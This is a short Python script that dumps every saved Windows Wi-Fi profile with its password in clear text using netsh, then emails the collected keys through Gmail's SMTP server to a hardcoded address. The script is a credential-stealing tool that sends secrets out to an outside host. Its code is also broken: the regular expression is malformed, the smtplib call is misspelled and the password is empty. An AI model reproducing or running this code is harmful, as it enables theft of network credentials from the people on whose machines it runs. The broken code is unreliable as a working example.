#!/usr/bin/python

import subprocess, smtplib, re

def main():
                command1 = "netsh wlan show profile"
                networks = subprocess.check_output(command1, shell=True)
                network_list = re.findall("?:Profile\s*:\s)(.*)", networks)

                final_output = ""
                for network in network_list:
                    command2 = "netsh wlan show profile " + network + " key=clear"
                    one_network_result = subprocess.check_output(command2, shell=True)
                    final_output += one_network_result

                my_email = "maiquelgoelzer@gmail.com"
                email = "maiquelgoelzer@gmail.com"
                password = ""

                server = smtpli.smtp("smtp.gmail.com", 587)
                server.starttls()
                server.login(email, password)
                server.sendmail(my_email, my_email, final_output)
                server.quit()

main()